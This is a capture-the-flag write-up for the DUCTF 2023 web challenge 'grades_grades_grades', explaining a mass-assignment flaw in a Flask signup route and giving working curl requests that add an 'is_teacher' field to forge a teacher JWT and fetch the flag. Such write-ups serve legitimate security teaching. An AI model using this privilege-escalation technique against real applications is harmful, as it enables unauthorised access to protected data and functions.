# grades_grades_grades

## Description

Sign up and see those grades :D! How well did you do this year's subject? Author: donfran

Application: [https://web-grades-grades-grades-c4627b227382.2023.ductf.dev](https://web-grades-grades-grades-c4627b227382.2023.ductf.dev/)<br>
Downloads: [grades_grades_grades.tar.gz](https://play.duc.tf/files/119a75b4dffb65cc95258ced3e917ee0/grades_grades_grades.tar.gz?token=eyJ1c2VyX2lkIjoyNDI4LCJ0ZWFtX2lkIjoxMjc1LCJmaWxlX2lkIjo3OX0.ZPQ8vg.50gUr8qITMPd-xMcQkEJ6bkgIoc)

##  Analysis

Looking into source code to get the flag we need to be 1. Authorized and 2. Teacher.

```py
@api.route('/grades_flag', methods=('GET',))
@requires_teacher
def flag():
    return render_template('flag.html', flag="FAKE{real_flag_is_on_the_server}", is_auth=True, is_teacher_role=True)
```

Signup:
```py
@api.route('/signup', methods=('POST', 'GET'))
def signup():

    # make sure user isn't authenticated
    if is_teacher_role():
        return render_template('public.html', is_auth=True, is_teacher_role=True)
    elif is_authenticated():
        return render_template('public.html', is_auth=True)

    # get form data
    if request.method == 'POST':
        jwt_data = request.form.to_dict()
        jwt_cookie = current_app.auth.create_token(jwt_data)
        if is_teacher_role():
            response = make_response(redirect(url_for('api.index', is_auth=True, is_teacher_role=True)))
        else:
            response = make_response(redirect(url_for('api.index', is_auth=True)))
        
        response.set_cookie('auth_token', jwt_cookie, httponly=True)
        return response

    return render_template('signup.html')
```

Authentication is pretty simple. Get data from form, create token and authenticate. Source code shows that if `is_teacher` is set in JWT token we are considered teacher. <br>
Signup already is vulnerable, because of `jwt_data = request.form.to_dict()`. There's no sanitization or field validation.

![grades_grades_grades-1](/assets/ctf/ductf/grades_grades_grades-1.png)

## Solution

Let's replicate the API call, but add extra field `is_teacher`.
1.  `-D -` to dump headers (Post and Head request can't be sent at the same time with cUrl).
2.  `-X POST` make a post request.
3. `-d "stu_num=test&stu_email=test%40test.test&password=test&is_teacher=NoDoubt"`
	* Post data
	* Extra field: `is_teacher=NoDoubt` (Can be anything because code is checking that field exists)
4. Server URL

```bash
└─$ curl \
    -D - \
    -X POST \
    -d "stu_num=test&stu_email=test%40test.test&password=test&is_teacher=NoDoubt" \
    'https://web-grades-grades-grades-c4627b227382.2023.ductf.dev/signup'
HTTP/2 302 
content-type: text/html; charset=utf-8
date: Sun, 03 Sep 2023 08:14:15 GMT
location: /?is_auth=True
server: Werkzeug/2.3.7 Python/3.8.18
set-cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoidGVzdCIsInN0dV9lbWFpbCI6InRlc3RAdGVzdC50ZXN0IiwicGFzc3dvcmQiOiJ0ZXN0IiwiaXNfdGVhY2hlciI6Ik5vRG91YnQifQ.Uzw8QVGgp0LjhszDn2ERzdRqEASBdZ3vx-bxVj8vcMk; HttpOnly; Path=/
content-length: 215

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?is_auth=True">/?is_auth=True</a>. If not, click the link.                                 
```

Make a request to `grades_flag` with `auth_token` of "Teacher".

```bash
└─$ curl \
    -b 'auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoidGVzdCIsInN0dV9lbWFpbCI6InRlc3RAdGVzdC50ZXN0IiwicGFzc3dvcmQiOiJ0ZXN0IiwiaXNfdGVhY2hlciI6Ik5vRG91YnQifQ.Uzw8QVGgp0LjhszDn2ERzdRqEASBdZ3vx-bxVj8vcMk' \
    https://web-grades-grades-grades-c4627b227382.2023.ductf.dev/grades_flag \
    -s | 
    grep DUCTF
                    <td>DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}</td>                
```
::: tip Flag
`DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}`
:::

## Note

If you don't prefer using cUrl and want more UI you can use BurpSuite. <br>
Go to singup -> intercept -> add `is_teacher` to request -> Login -> go to `GRADING TOOL` page -> Profit.